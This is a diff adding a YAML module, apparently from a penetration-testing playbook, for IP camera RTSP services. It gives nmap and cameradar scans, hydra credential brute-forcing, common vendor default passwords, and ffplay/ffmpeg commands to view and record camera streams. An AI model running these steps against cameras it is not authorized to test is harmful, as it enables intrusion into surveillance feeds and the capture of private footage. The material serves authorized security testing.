@@ -1,0 +1,60 @@
+module: rtsp
+name: RTSP (554 / 8554)
+inputs: [USERS, PASS, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / server + methods
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=rtsp-methods $IP
+      - id: options
+        text: Manual OPTIONS/DESCRIBE probe
+        manual: true
+        commands: |
+          # OPTIONS rtsp://$IP:$PORT RTSP/1.0\r\nCSeq: 1\r\n\r\n   (via nc)
+
+  - id: enum
+    name: Stream Path Enumeration
+    steps:
+      - id: url_brute
+        text: Brute-force stream paths
+        commands: |
+          nmap -p$PORT --script=rtsp-url-brute $IP
+      - id: cameradar
+        text: Discover streams + default routes (cameradar)
+        commands: |
+          cameradar -t $IP -p $PORT
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute
+        text: Brute-force camera credentials
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST rtsp://$IP -s $PORT
+          cameradar -t $IP -p $PORT -c /path/credentials.json
+      - id: default_creds
+        text: Try vendor defaults (admin/admin, admin/12345, etc.)
+        manual: true
+        commands: |
+          # common: admin:admin, admin:12345, root:root, admin:<blank>
+
+  - id: access
+    name: Stream Access
+    steps:
+      - id: view
+        text: Open the stream
+        commands: |
+          ffplay rtsp://$USER:$PASS@$IP:$PORT/<path>
+          vlc rtsp://$IP:$PORT/<path>
+      - id: capture
+        text: Record footage for evidence
+        manual: true
+        commands: |
+          ffmpeg -i rtsp://$USER:$PASS@$IP:$PORT/<path> -t 20 $OUT/cam.mp4
